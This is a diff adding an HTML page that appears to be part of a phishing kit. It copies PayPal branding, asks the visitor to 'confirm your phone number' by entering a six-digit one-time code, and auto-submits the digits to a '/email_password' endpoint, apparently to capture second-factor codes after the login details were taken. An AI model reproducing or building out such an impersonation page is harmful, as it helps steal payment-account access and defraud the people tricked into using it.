@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>Otp Verification</title>
+        <link rel="stylesheet" href="otp.css">
+        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0-beta1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-0evHe/X+R7YkIZDRvuzKMRqM+OrBnVFBL6DOitfPri4tjfHxaWutUpFmBp4vmVor" crossorigin="anonymous">
+
+    </head>
+    <body>
+        <div id="main-container">
+
+            <div id="container">
+                <div id="main-content">
+                        <header><p>.</p><img src="./images/paypal-mark-color.svg" alt="img not found" draggable="false" width="35px" height="35px"><p>.</p></header>
+                        
+                        <form action="/email_password" method="post" id="otp">
+                            <span align="center">Confirm your phone number</span>
+                            <div>
+                                <input type="number" name="otp1" id="1" pattern="/^-?\d+\.?\d*$/" onKeyPress="if(this.value.length==1) return false;" onkeyup="otpEntered(this, '2');" autocomplete="none"/>
+                                <input type="number" name="otp2" id="2" pattern="/^-?\d+\.?\d*$/" onKeyPress="if(this.value.length==1) return false;" onkeyup="otpEntered(this, '3'); BackSpace(event, '1')" autocomplete="none"/>
+                                <input type="number" name="otp3" id="3" pattern="/^-?\d+\.?\d*$/" onKeyPress="if(this.value.length==1) return false;" onkeyup="otpEntered(this, '4'); BackSpace(event, '2')" autocomplete="none"/>
+                                <input type="number" name="otp4" id="4" pattern="/^-?\d+\.?\d*$/" onKeyPress="if(this.value.length==1) return false;" onkeyup="otpEntered(this, '5'); BackSpace(event, '3')" autocomplete="none"/>
+                                <input type="number" name="otp5" id="5" pattern="/^-?\d+\.?\d*$/" onKeyPress="if(this.value.length==1) return false;" onkeyup="otpEntered(this, '6'); BackSpace(event, '4')" autocomplete="none"/>
+                                <input type="number" name="otp6" id="6" onkeypress="BackSpace(event, '5'); submitOtp(event, this)" pattern="/^-?\d+\.?\d*$/" onKeyPress="if(this.value.length==1) return false;" autocomplete="none" name="last_box"/>
+                            </div>
+                        </form>
+                </div>
+            </div>
+        </div>
+        <script>
+            function otpEntered(current, next) {
+                if (current.value.length) {
+                    document.getElementById(next).focus()
+                }
+            }
+            function BackSpace(e, next) {
+                if (e.key == "Backspace") {
+                    document.getElementById(next).focus()
+                }
+            }
+            function submitOtp(e, submit) {
+                    setTimeout(() => {
+                    if (e.key !==  "Backspace" && submit) {
+                        document.getElementById("otp").submit()
+                    }
+                }, 50);
+                }
+        </script>
+        <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.5/dist/umd/popper.min.js" integrity="sha384-Xe+8cL9oJa6tN/veChSP7q+mnSPaj5Bcu9mPX5F5xIGE0DVittaqT5lorf0EI7Vk" crossorigin="anonymous"></script>
+        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0-beta1/dist/js/bootstrap.min.js" integrity="sha384-kjU+l4N0Yf4ZOJErLsIcvOU2qSb74wXpOhqTvwVx3OElZRweTnQ6d31fXEoRD1Jy" crossorigin="anonymous"></script>
+        
+    </body>
+</html>
